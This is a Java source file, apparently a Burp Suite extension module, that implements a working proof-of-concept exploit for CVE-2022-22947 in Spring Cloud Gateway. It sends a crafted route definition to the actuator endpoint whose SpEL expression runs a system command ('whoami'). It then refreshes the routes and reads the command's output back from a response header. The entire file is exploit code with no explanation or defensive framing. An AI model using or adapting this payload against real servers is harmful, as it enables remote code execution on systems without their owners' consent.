package burp.poc;

import burp.*;

import java.util.LinkedHashMap;
import java.util.Map;

public class spring_CVE_2022_22947 {

    public  static IHttpRequestResponse poc(String url, IHttpRequestResponse messageInfo, IExtensionHelpers help, IBurpExtenderCallbacks call) {
        Map<String,String> dict1 = new LinkedHashMap<String,String>();
        Map<String,String> dict2 = new LinkedHashMap<String,String>();
        dict1.put("Accept-Encoding","gzip, deflate");
        dict1.put("Accept","*/*");
        dict1.put("Accept-Language","en");
        dict1.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        dict1.put("Content-Type","application/json");
        dict2.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        dict2.put("Content-Type","application/x-www-form-urlencoded");
        String payload = "{\r" +
                "\"id\": \"hacktest\",\r" +
                "\"filters\": [{\r" +
                "\"name\": \"AddResponseHeader\",\r" +
                "\"args\": {\"name\": \"Result\",\"value\": \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"whoami\\\"}).getInputStream()))}\"}\r" +
                "}],\r" +
                "\"uri\": \"http://example.com\",\r" +
                "\"order\": 0\r" +
                "}";
        HttpsRequest.sendPost(url+"/actuator/gateway/routes/hacktest",payload,dict1);
        HttpsRequest.sendPost(url+"/actuator/gateway/refresh","",dict2);
        Map<String, String> fanhui = HttpsRequest.sendGet(url+"/actuator/gateway/routes/hacktest","",dict2);
        if (fanhui != null) {
            IHttpService service = messageInfo.getHttpService();
            IHttpService NewService = help.buildHttpService(service.getHost(), service.getPort(), service.getProtocol());
            byte[] qingqiu = help.buildHttpRequest(BurpExtender.Get_URL(url+"/actuator/gateway/routes/hacktest"));
            IParameter canshu1 = help.buildParameter("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",IParameter.PARAM_BODY);
            IParameter canshu2 = help.buildParameter("Content-Type","application/x-www-form-urlencoded",IParameter.PARAM_BODY);
            help.addParameter(qingqiu,canshu1);
            help.addParameter(qingqiu,canshu2);

            return call.makeHttpRequest(NewService, qingqiu);

        }
        return null;

    }


}


